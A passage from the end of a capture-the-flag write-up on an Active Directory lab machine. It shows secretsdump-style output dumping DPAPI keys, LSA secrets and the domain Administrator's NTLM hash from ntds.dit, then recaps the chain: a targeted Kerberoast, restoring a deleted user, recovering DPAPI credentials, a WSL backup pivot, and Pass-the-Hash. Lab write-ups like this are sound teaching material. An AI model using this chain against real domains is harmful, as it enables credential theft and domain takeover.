dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2<SNIP>
[*] Cleaning up...
```

With the domain administrator's NTLM hash in hand, I can simply authenticate using Pass-the-Hash. The final step is to grab the `root.txt` flag and call it a day.

### Final Thoughts

This machine does a great job of simulating an assumed breach inside an Active Directory environment. Instead of relying on a single vulnerability, each step builds naturally on the last.

Starting with low-privileged credentials, I abuse **WriteSPN** to perform a targeted Kerberoast, restore a deleted user through the **Restore Users** group, recover DPAPI-protected credentials from an archived profile, pivot into a WSL backup environment, and finally extract the domain database to recover the Administrator hash.

There aren't any flashy exploits or memory corruption bugs here just careful enumeration, understanding Active Directory permissions, and taking advantage of the access that's already available.

It's a good reminder that in real-world environments, the biggest weakness often isn't an unpatched vulnerability.

It's years of accumulated administrative shortcuts waiting for someone to connect the dots.